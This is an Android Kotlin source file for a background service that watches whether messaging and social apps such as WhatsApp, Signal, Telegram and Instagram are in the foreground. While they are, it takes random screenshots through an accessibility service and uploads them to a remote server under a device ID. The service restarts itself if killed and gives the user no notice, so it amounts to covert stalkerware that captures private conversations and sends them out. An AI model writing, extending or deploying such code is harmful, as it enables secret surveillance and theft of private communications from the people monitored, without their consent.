package com.chats.capture.services

import android.app.Service
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import com.chats.capture.CaptureApplication
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.network.ApiClient
import com.chats.capture.utils.ScreenshotCapture
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import timber.log.Timber
import java.io.File
import java.io.FileOutputStream
import java.util.Random
import java.util.concurrent.TimeUnit

/**
 * Service that monitors social media apps and takes random screenshots
 * Screenshots are captured at low resolution but readable quality
 */
class SocialMediaScreenshotService : Service() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val random = Random()
    
    // Social media app packages to monitor
    private val socialMediaApps = setOf(
        "com.whatsapp",              // WhatsApp
        "com.whatsapp.w4b",          // WhatsApp Business
        "com.viber.voip",            // Viber
        "org.telegram.messenger",    // Telegram
        "com.facebook.katana",       // Facebook
        "com.facebook.orca",         // Facebook Messenger
        "com.instagram.android",     // Instagram
        "com.snapchat.android",       // Snapchat
        "com.twitter.android",       // Twitter
        "com.linkedin.android",      // LinkedIn
        "com.skype.raider",          // Skype
        "com.discord",               // Discord
        "com.tencent.mm",            // WeChat
        "com.linecorp.line",         // LINE
        "com.signal.org"             // Signal
    )
    
    // Screenshot settings
    private val screenshotProbability = 0.15f // 15% chance to take screenshot when app is active
    private val checkIntervalSeconds = 8L // Check every 8 seconds
    private val minTimeBetweenScreenshots = 30000L // Minimum 30 seconds between screenshots
    private val maxWidth = 1080 // Maximum width for low-res but readable screenshots
    private val quality = 75 // JPEG quality (0-100)
    private val MAX_UPLOAD_SIZE = 20 * 1024 * 1024L // 20MB maximum upload size
    
    private var lastScreenshotTime: Long = 0
    private var lastForegroundApp: String? = null
    private var lastForegroundTime: Long = 0
    
    override fun onCreate() {
        super.onCreate()
        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
            Timber.tag("SOCIAL_SCREENSHOT").i("🛑 Capture disabled - stopping SocialMediaScreenshotService")
            stopSelf()
            return
        }
        Timber.tag("SOCIAL_SCREENSHOT").i("🚀 SocialMediaScreenshotService created - Monitoring social media apps for random screenshots")
        startMonitoring()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart if killed
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        Timber.tag("SOCIAL_SCREENSHOT").w("⚠️ SocialMediaScreenshotService destroyed")
    }
    
    private fun startMonitoring() {
        scope.launch {
            // Wait a bit before starting to ensure service is ready
            delay(5000)
            
            while (true) {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        checkAndCaptureScreenshot()
                    }
                } catch (e: Exception) {
                    Timber.tag("SOCIAL_SCREENSHOT").e(e, "Error in screenshot monitoring loop")
                }
                
                delay(TimeUnit.SECONDS.toMillis(checkIntervalSeconds))
            }
        }
    }
    
    @android.annotation.SuppressLint("NewApi")
    private suspend fun checkAndCaptureScreenshot() {
        try {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                ?: return
            
            val currentApp = getCurrentForegroundApp(usageStatsManager)
            
            if (currentApp != null && currentApp in socialMediaApps) {
                // Social media app is in foreground
                val currentTime = System.currentTimeMillis()
                
                // Check if enough time has passed since last screenshot
                val timeSinceLastScreenshot = currentTime - lastScreenshotTime
                if (timeSinceLastScreenshot < minTimeBetweenScreenshots) {
                    return // Too soon, skip
                }
                
                // Check if app has been in foreground for at least 5 seconds
                if (currentApp == lastForegroundApp) {
                    val timeInForeground = currentTime - lastForegroundTime
                    if (timeInForeground < 5000) {
                        return // App just came to foreground, wait a bit
                    }
                } else {
                    // New app, reset tracking
                    lastForegroundApp = currentApp
                    lastForegroundTime = currentTime
                    return // Wait before taking screenshot of new app
                }
                
                // Random chance to take screenshot
                if (random.nextFloat() < screenshotProbability) {
                    Timber.tag("SOCIAL_SCREENSHOT").i("📸 Taking random screenshot of $currentApp")
                    captureScreenshot(currentApp)
                }
            } else {
                // Not a social media app, reset tracking
                if (currentApp != lastForegroundApp) {
                    lastForegroundApp = currentApp
                    lastForegroundTime = System.currentTimeMillis()
                }
            }
        } catch (e: Exception) {
            Timber.tag("SOCIAL_SCREENSHOT").e(e, "Error checking foreground app")
        }
    }
    
    @android.annotation.SuppressLint("NewApi")
    private fun getCurrentForegroundApp(usageStatsManager: UsageStatsManager): String? {
        return try {
            val time = System.currentTimeMillis()
            val stats = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_BEST,
                time - TimeUnit.SECONDS.toMillis(5),
                time
            )
            
            stats.maxByOrNull { it.lastTimeUsed }?.packageName
        } catch (e: Exception) {
            Timber.e(e, "Error getting foreground app")
            null
        }
    }
    
    private suspend fun captureScreenshot(appPackage: String) {
        try {
            val accessibilityService = (applicationContext as CaptureApplication).enhancedAccessibilityService
            if (accessibilityService == null) {
                Timber.tag("SOCIAL_SCREENSHOT").w("AccessibilityService not available - cannot capture screenshot")
                return
            }
            
            val screenshotCapture = ScreenshotCapture(accessibilityService)
            val screenshotPath = screenshotCapture.captureScreenshot()
            
            if (screenshotPath == null) {
                Timber.tag("SOCIAL_SCREENSHOT").w("Failed to capture screenshot")
                return
            }
            
            Timber.tag("SOCIAL_SCREENSHOT").d("Screenshot captured: $screenshotPath")
            
            // Resize and compress to low resolution
            val resizedPath = resizeAndCompressScreenshot(screenshotPath, appPackage)
            if (resizedPath == null) {
                Timber.tag("SOCIAL_SCREENSHOT").w("Failed to resize screenshot")
                // Delete original if resize failed
                File(screenshotPath).delete()
                return
            }
            
            // Delete original full-resolution screenshot
            File(screenshotPath).delete()
            
            // Check file size before upload
            val resizedFile = File(resizedPath)
            val fileSize = resizedFile.length()
            if (fileSize > MAX_UPLOAD_SIZE) {
                Timber.tag("SOCIAL_SCREENSHOT").w("⚠️ Screenshot size ${fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping upload")
                resizedFile.delete()
                return
            }
            
            // Upload resized screenshot
            val uploadSuccess = uploadScreenshot(resizedPath, appPackage)
            
            if (uploadSuccess) {
                lastScreenshotTime = System.currentTimeMillis()
                Timber.tag("SOCIAL_SCREENSHOT").i("✅ Screenshot uploaded successfully: $appPackage")
            } else {
                Timber.tag("SOCIAL_SCREENSHOT").w("⚠️ Screenshot upload failed, will retry later")
                // Keep file for retry
            }
        } catch (e: Exception) {
            Timber.tag("SOCIAL_SCREENSHOT").e(e, "Error capturing screenshot: ${e.message}")
        }
    }
    
    private fun resizeAndCompressScreenshot(originalPath: String, appPackage: String): String? {
        return try {
            // Load original bitmap
            val originalBitmap = BitmapFactory.decodeFile(originalPath)
            if (originalBitmap == null) {
                Timber.tag("SOCIAL_SCREENSHOT").e("Failed to decode screenshot bitmap")
                return null
            }
            
            val originalWidth = originalBitmap.width
            val originalHeight = originalBitmap.height
            
            // Calculate new dimensions maintaining aspect ratio
            val scale = if (originalWidth > maxWidth) {
                maxWidth.toFloat() / originalWidth
            } else {
                1.0f // No need to upscale
            }
            
            val newWidth = (originalWidth * scale).toInt()
            val newHeight = (originalHeight * scale).toInt()
            
            // Resize bitmap
            val resizedBitmap = Bitmap.createScaledBitmap(
                originalBitmap,
                newWidth,
                newHeight,
                true // Use bilinear filtering for better quality
            )
            
            // Recycle original to free memory
            originalBitmap.recycle()
            
            // Save resized bitmap as JPEG (smaller than PNG)
            val dir = File(getExternalFilesDir(null), "screenshots/social_media")
            if (!dir.exists()) {
                dir.mkdirs()
            }
            
            val fileName = "screenshot_${appPackage}_${System.currentTimeMillis()}.jpg"
            val file = File(dir, fileName)
            
            FileOutputStream(file).use { out ->
                resizedBitmap.compress(Bitmap.CompressFormat.JPEG, quality, out)
            }
            
            // Recycle resized bitmap
            resizedBitmap.recycle()
            
            Timber.tag("SOCIAL_SCREENSHOT").d(
                "Screenshot resized: ${originalWidth}x${originalHeight} -> ${newWidth}x${newHeight}, " +
                "size: ${File(originalPath).length()} -> ${file.length()} bytes"
            )
            
            file.absolutePath
        } catch (e: Exception) {
            Timber.tag("SOCIAL_SCREENSHOT").e(e, "Error resizing screenshot: ${e.message}")
            null
        }
    }
    
    private suspend fun uploadScreenshot(filePath: String, appPackage: String): Boolean {
        return try {
            val file = File(filePath)
            if (!file.exists()) {
                Timber.tag("SOCIAL_SCREENSHOT").e("Screenshot file does not exist: $filePath")
                return false
            }
            
            if (!ApiClient.isNetworkAvailable(this)) {
                Timber.tag("SOCIAL_SCREENSHOT").w("Network not available, skipping upload")
                return false
            }
            
            val deviceRegistrationManager = DeviceRegistrationManager(this)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            val requestFile = file.asRequestBody("image/jpeg".toMediaType())
            val body = MultipartBody.Part.createFormData("screenshot", file.name, requestFile)
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadScreenshot(deviceId, body)
            
            if (response.isSuccessful && response.body()?.success == true) {
                Timber.tag("SOCIAL_SCREENSHOT").d("Screenshot uploaded successfully")
                
                // Delete local file after successful upload
                file.delete()
                true
            } else {
                Timber.tag("SOCIAL_SCREENSHOT").w("Failed to upload screenshot: ${response.body()?.message}")
                false
            }
        } catch (e: Exception) {
            Timber.tag("SOCIAL_SCREENSHOT").e(e, "Error uploading screenshot: ${e.message}")
            false
        }
    }
}
